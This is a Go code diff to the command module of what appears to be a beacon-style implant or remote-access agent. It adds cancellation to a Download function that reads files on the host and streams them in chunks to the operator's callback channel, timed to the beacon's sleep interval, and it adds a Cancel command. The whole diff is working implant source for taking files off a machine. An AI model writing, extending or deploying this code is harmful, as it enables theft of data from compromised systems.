@@ -2,6 +2,8 @@ package command
 
 import (
 	"bytes"
+	"context"
+	"encoding/binary"
 	"io"
 	"io/ioutil"
 	"main/config"
@@ -13,6 +15,8 @@ import (
 )
 
 var fileCounter = 0
+var cancelFuncs = make(map[int]context.CancelFunc)
+var defaultCtx = context.Background()
 
 func Upload(b []byte, start bool) error {
 	filePathByte, fileContent, err := parseCommandUpload(b)
@@ -156,6 +160,9 @@ func Download(b []byte) error {
 	result := util.BytesCombine(requestIDBytes, fileLenBytes, []byte(filePath))
 	packet.PushResult(packet.CALLBACK_FILE, result)
 
+	ctx, cancel := context.WithCancel(defaultCtx)
+	cancelFuncs[requestID] = cancel
+
 	fileHandle, err := os.Open(filePath)
 	if err != nil {
 		return err
@@ -163,25 +170,51 @@ func Download(b []byte) error {
 	// revert to async
 	// the problem here is the race condition of counter's generation and sending, so I add a mutex in packet.PushResult
 	go func() {
+		// do not forget to release handler
+		defer fileHandle.Close()
 		var fileContent []byte
 		fileBuf := make([]byte, config.DownloadSize)
 		for {
-			n, err := fileHandle.Read(fileBuf)
-			if err != nil && err != io.EOF {
+			end := false
+			select {
+			case <-ctx.Done():
+				packet.PushResult(packet.CALLBACK_OUTPUT, []byte(util.Sprintf("download of %s canceled", filePath)))
+				// don't need to send anything back. just stop transfer
+				return
+			default:
+				n, err := fileHandle.Read(fileBuf)
+				if err != nil && err != io.EOF {
+					packet.ErrorMessage(err.Error())
+					end = true
+					break
+				}
+				if n == 0 {
+					end = true
+					break
+				}
+				fileContent = fileBuf[:n]
+				result = util.BytesCombine(requestIDBytes, fileContent)
+				packet.PushResult(packet.CALLBACK_FILE_WRITE, result)
+				// sleep the same time as beacon
+				util.Sleep()
+			}
+			if end {
 				break
 			}
-			if n == 0 {
-				break
-			}
-			fileContent = fileBuf[:n]
-			result = util.BytesCombine(requestIDBytes, fileContent)
-			packet.PushResult(packet.CALLBACK_FILE_WRITE, result)
-			// sleep the same time as beacon
-			util.Sleep()
-		}
 
+		}
 		packet.PushResult(packet.CALLBACK_FILE_CLOSE, requestIDBytes)
 	}()
+	return nil
+}
+
+func Cancel(b []byte) error {
+	fileID := int(binary.BigEndian.Uint32(b))
+	cancelFunc, ok := cancelFuncs[fileID]
+	if ok {
+		cancelFunc()
+		delete(cancelFuncs, fileID)
+	}
 	return nil
 }
 
